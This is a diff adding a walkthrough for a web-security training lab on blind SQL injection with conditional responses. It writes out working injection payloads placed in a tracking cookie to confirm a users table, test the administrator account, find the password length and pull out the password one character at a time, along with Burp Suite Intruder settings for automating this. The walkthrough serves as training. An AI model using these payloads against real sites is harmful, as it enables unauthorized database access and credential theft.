@@ -1,0 +1,71 @@
+Lab #9: Blind SQL injection with conditional responses
+
+Target:
+  log in as the administrator user.  
+Hint: 
+  This lab contains a blind SQL injection vulnerability. 
+  The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+  The results of the SQL query are not returned, and no error messages are displayed. 
+  But the application includes a Welcome back message in the page if the query returns any rows.
+
+  The database contains a different table called users, with columns called username and password. 
+  You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+Solution:
+
+  1- search for some input vulnerable to sqlinjection
+    the TranckingId parameter in the cookie seems to be vulnerable:
+    when the trackId exists the return response contains "welcome back" message
+
+    change the trackId : the return has no welcome back message
+
+    now test:
+      ' and 1=1--  : welcome back
+
+      ' and 1=0--   : no welcome back
+
+    2- confirm that there is a users table:
+
+    ' and (select 'x' from users LIMIT 1)='x'--
+    result: welcome back!
+    so there is such table
+
+
+    3- confirm that there is a user, named administrator
+
+       ' and (select username from users where username='administrator')='administrator'--
+        result: welcome back!
+        so the user administrator exists
+
+    4- check for the length of password for administrator
+        ' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--
+      make it to check for length 30 and result: no welcome back message.
+      So the length is smaller than 30
+      But it is not possible to do all tests manually.
+      So send the get request to burpsuit intruder
+      select number 1 (length and add this attack position)
+      in the payload select type as number, sequentional and from 1 to 30.
+      start the attack. 
+      you see that from the 20th attack request the length of response is less, as it has no welcome message.
+      That means length of password is exactly 20 characters.
+    
+    5- enumerate the characters of password one by one
+
+        ' and (select substring(password,1,1) from users where username='administrator')='a'--
+
+      desc: select a substring of password column, which is 1 character long strarting from the 1st character.
+      if it is equal to a, we have welcome back message in the result
+      use the burpsuit intruder and use payload type as bruteforcer min len=1, max len=1
+
+      result: the first character is '4'
+
+      to repeat it for all 20 characters:
+      use burpsuit intruder
+      select attack type as cluster bomb
+            ' and (select substring(password,§1§ ,1) from users where username='administrator')='§a§'--
+
+            and select both offset and password character as the payload position, 
+              and setup each payload type.
+
+    
